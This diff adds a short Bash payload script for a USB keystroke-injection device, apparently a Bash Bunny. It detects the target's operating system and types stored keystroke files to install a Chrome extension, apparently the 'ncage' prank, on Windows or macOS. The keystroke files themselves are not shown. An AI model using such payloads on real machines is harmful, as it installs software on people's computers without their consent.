@@ -1,0 +1,44 @@
+#!/bin/bash
+
+# ATTENTION: Requires newest firmware with newest extensions
+
+# Installs the ncage (or any) Google Chrome extension
+# using jquery which is kindly supplied by the app store.
+
+## Status
+# | LED              | Status         |
+# | ---------        | -----------    |
+# | Magenta Solid    |  Setting up    |
+# | Blue Blinking    |  Attacking     |
+# | Green            |  Finished      |
+# | Red              |  Failed        |
+
+## Setup
+LED SETUP
+ATTACKMODE AUTO_ETHERNET ETHERNET_TIMEOUT_10
+GET TARGET_OS
+GET SWITCH_POSITION
+
+LED ATTACK
+
+case "$TARGET_OS" in
+
+  WINDOWS)
+    ATTACKMODE HID
+    QUACK ${SWITCH_POSITION}/win.txt
+    LED FINISH
+    ;;
+
+  MACOS)
+    MAC_HAPPY ATTACKMODE HID
+    QUACK ${SWITCH_POSITION}/osx.txt
+    LED FINISH
+    ;;
+
+  *)
+    DEBUG "ncage" "OS Not Detected"
+    LED FAIL2
+    ;;
+
+esac
+
